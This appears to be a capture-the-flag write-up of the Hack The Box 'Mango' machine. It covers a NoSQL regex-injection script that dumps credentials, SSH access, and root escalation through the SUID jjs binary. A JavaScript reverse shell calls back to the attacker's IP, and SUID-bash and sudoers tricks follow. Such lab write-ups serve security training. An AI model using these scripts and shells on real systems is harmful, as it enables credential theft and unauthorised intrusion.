## Default Information
IP Address: 10.10.10.162\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.162    mango.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.162 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-24 10:03:03 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 443/tcp on 10.10.10.162                                   
Discovered open port 80/tcp on 10.10.10.162                                    
Discovered open port 22/tcp on 10.10.10.162  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80  | HTTP | Apache httpd 2.4.29 | Open |
| 443  | HTTP | Apache httpd 2.4.29 ((Ubuntu)) | Open |

However, the nmap scan picks up the public key cert for https and the issuer is staging-order.mango.htb.

```
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/organizationalUnitName=None/emailAddress=admin@mango.htb
| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN/localityName=None/organizationalUnitName=None/emailAddress=admin@mango.htb
```

Knowing that, we will add staging-order.mango.htb into our /etc/hosts file. 

```
10.10.10.163    mango.htb staging-order.mango.htb
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://mango.htb. Unfortunately, we are unable to find any valid endpoints from port 80.

Next, we will use Gobuster again to find any endpoints that are accessibel from https://mango.htb. This time round, we are able to find several useful endpoints.

```
https://10.10.10.162:443/analytics.php        (Status: 200) [Size: 397607]
https://10.10.10.162:443/index.php            (Status: 200) [Size: 5152]
```

We will then proceed to use Gobuster again to find endpoints from http://staging-order.mango.htb.

```
http://staging-order.mango.htb/home.php             (Status: 302) [Size: 0] [--> index.php]
http://staging-order.mango.htb/index.php            (Status: 200) [Size: 4022]
http://staging-order.mango.htb/index.php            (Status: 200) [Size: 4022]
http://staging-order.mango.htb/vendor               (Status: 301) [Size: 335] [--> http://staging-order.mango.htb/vendor/]
```

Lastly, we will use gobuster to find for possible subdomains for http://mango.htb. However, we are unable to find anymore subdomains of interest

### Web-content discovery

Navigating to https://mango.htb/analytics.php, we are presented with an interface that shows us some business analytics. However, we realize that we are unable to view any information as the key is invalid. 

![Invalid key](https://github.com/joelczk/writeups/blob/main/HTB/Images/Mango/invalid_key.png)

Next, navigating to http://staging-order.mango.htb, we are presented with a login page. 

Using the SQL Injection Auth Bypass payload from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder), we realize that the login site is not vulnerable to SQL Injection.

However, using the NoSQL Injection payload from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt)

![No SQL Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Mango/no_sql.png)

Using the NoSQL payload that we have used earlier, we realize that a successful login will redirect us to the home.php page.

![Home.php page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Mango/home_php.png)

## Exploit
### Dumping username and password using NoSQL Injection
Next, what we have to do is to write a script to dump all the usernames and passwords.

First, we have to dump all the usernames that is stored in the NoSQL database. To do that, we will have to make use of the regex matching in the username. To do that, we will have to bruteforce the username in ```username[$regex]=^{bruteforce}.*&password=.*&login=login```. To achieve that, we can write a script to obtain the usernames.

```python
def getEntireUsername(session, url, cookies, firstchar):
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    username = "^" + firstchar
    while True:
        for c in possible_chars:
            params["username[$regex]"] = username + c + ".*"
            resp = session.post(url, data=params, cookies=cookies, verify=False, allow_redirects=False)
            if int(resp.status_code) == 302:
                username += c
                print(username)
                break
            if c == possible_chars[-1]:
                print("[!] Found username : {user}".format(user=username[1:]))
                return username[1:]

def getUsernames(session, url, cookies):
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c + ".*"
        params["username[$regex]"] = username
        resp = session.post(url, data=params, cookies=cookies, verify=False, allow_redirects=False)
        if int(resp.status_code) == 302:
            user = getEntireUsername(session,url,cookies,c)
            password = getPassword(session, url, cookies, user)
            print("[!] Found password: {password}".format(password=password))
```
Similarly, we will also have to do the same to dump the password from the nosql database for the corresponding usernames. To do that, we will bruteforce the password in ```username[$regex]={username}&password=^{brute force password}.*&login=login```. To do so, we can again use the script to brute force the passwords.

```python
def getPassword(session, url, cookies, user):
    params = {"username":user, "password[$regex]":"", "login": "login"}    
    password = "^"
    while True:
        for c in possible_chars:
           params["password[$regex]"] = password + c + ".*"
           resp = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=False)
           if int(resp.status_code) == 302:
               password += c
               print(password)
               break
           if c == possible_chars[-1]:
               return password[1:].replace("\\", "")
```

Executing this script will give us 2 users and their corresponding passwords.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ python3 exploit.py
[!] Found username : admin
[!] Found password: t9KcS3>!0B#2
[!] Found username : mango
[!] Found password: h3mXK8RhU~f{]f5H
```
### Gaining SSH access as mango user
Using the admin:t9KcS3>!0B#2 credentials, we will try to gain access to SSH but unfortunately, we are unable to do so.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ ssh admin@10.10.10.162
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 
Permission denied, please try again.
admin@10.10.10.162's password: 
admin@10.10.10.162: Permission denied (publickey,password).
```

Next, we will try to use mango:h3mXK8RhU~f{]f5H to gain SSH access. Fortunately, we are able to gain SSH access this time round.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ ssh mango@10.10.10.162
mango@10.10.10.162's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138
mango@mango:~$ 
```

### Privilege Escalation to admin user
After gaining SSH access, we realize that the user flag is found in the /home/admin directory which we not have sufficient privileges to view. Hence, we will need to escalate ourselves to the user, admin.

```
mango@mango:/home$ cat mango/user.txt
cat: mango/user.txt: No such file or directory
mango@mango:/home$ cat admin/user.txt
cat: admin/user.txt: Permission denied
mango@mango:/home$ 
```

First, let use try to run sudo -l to find out what are the privileges that mango has on this server. Unfortunately, mango is unable to execute sudo commands on this server.

```
mango@mango:/home$ sudo -l
[sudo] password for mango: 
Sorry, user mango may not run sudo on mango.
```

Recalling that we have obtained the credentials of admin earlier, let us try to escalate our privileges with the credentials

```
mango@mango:/home$ su admin
Password: 
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ bash
admin@mango:/home$ 
```
### Obtaining user flag
```
admin@mango:/home$ cat /home/admin/user.txt
<Redacted user flag>
```

### Privilege Escalation to root

Using the linpeas script, we noticed that there is an SUID binary at /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs, that may be worth looking into. 

```
admin@mango:/tmp$ ls -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```
Apart from that, we also discover /usr/lib/snapd/snap-confine which may be vulnerable to CVE-2019-7304. However, checking the version of snap shows that it is 2.41 which means it is not vulnerable to CVE-2019-7304.

```
admin@mango:/tmp$ snap version
snap    2.41
snapd   2.41
series  16
ubuntu  18.04
kernel  4.15.0-64-generic
```

From [GTFO Bins](https://gtfobins.github.io/gtfobins/jjs/), we are able to spawn a reverse shell using jjs. However, we notice that using the payload specified on the page is unable to create a root shell. 

In order to create a root shell, we have to modify the javascript script to execute /bin/bash -p instead of /bin/bash -i. The -p option is required to enable the bash to keep the effective userid (root) after it is /bin/bash is executed so that we will have root privileges to view the root file. 

```
var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
var p=new ProcessBuilder("/bin/bash", "-p").redirectErrorStream(true).start();
var Socket = Java.type("java.net.Socket");
var s=new Socket("10.10.16.6",4000);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```

Lastly, we will execute the script using jjs

```
admin@mango:/tmp$ jjs script.js
Warning: The jjs tool is planned to be removed from a future JDK release
```

### Obtaining root flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.162] 43564
id      
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
cat /root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### SSH Access for admin user
The user, admin is unable to gain SSH access via the SSH command in the terminal due to the fact that this user is not allowed to SSH in /etc/ssh/sshd_config

```
AllowUsers mango root
```

### Exploiting jjs
Another way of obtaining the root flag is to use jjs to spawn an interactive shell that can execute commands

During the execution of this exploit, I realized that we would have to execute the commands one-by-one and not combine these commands together (For eg. cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt will not work)
```
admin@mango:/tmp$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /root/root.txt /tmp/root.txt').waitFor();
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod 777 /tmp/root.txt').waitFor();
0
jjs> exit()
admin@mango:/tmp$ cat root.txt
<Redacted root flag>
```

Another alternative way of exploiting jjs is to first copy the /bin/bash binary into /tmp/exploit. Afterwards, set the SUID on /tmp/exploit.

```
admin@mango:/tmp$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/bash /tmp/exploit').waitFor();
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /tmp/exploit').waitFor();
0
jjs> exit()
admin@mango:/tmp$ ls -la /tmp/exploit
-rwsr-xr-x 1 root admin 1113504 Dec 25 15:15 /tmp/exploit
```

After that, all we have to do is to execute /tmp/exploit with the ```-p``` flag to ensure that the /tmp/exploit retains the effective userid, to obtain a root shell.

```
admin@mango:/tmp$ /tmp/exploit -p
exploit-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
exploit-4.4# whoami
root
exploit-4.4#
```

The last way of exploitation is to add the admin user to the sudoers group. This way the admin user will be recognised as a sudoer and is able to privilege escalate into a root user easily. 

```
admin@mango:/tmp$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('usermod -aG sudo admin').waitFor();
0
jjs> exit()
```

However, in the current session of the admin user, the sudoers group is not yet updated to include the admin user.

```
admin@mango:/tmp$ sudo su -
[sudo] password for admin: 
admin is not in the sudoers file.  This incident will be reported.
```

What we have to do is to exit the current session and privilege escalate into the admin user again before we privilege escalate into the root user.

```
mango@mango:~$ su admin
Password: 
$ bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@mango:/home/mango$ sudo su -
[sudo] password for admin: 
root@mango:~# 
```
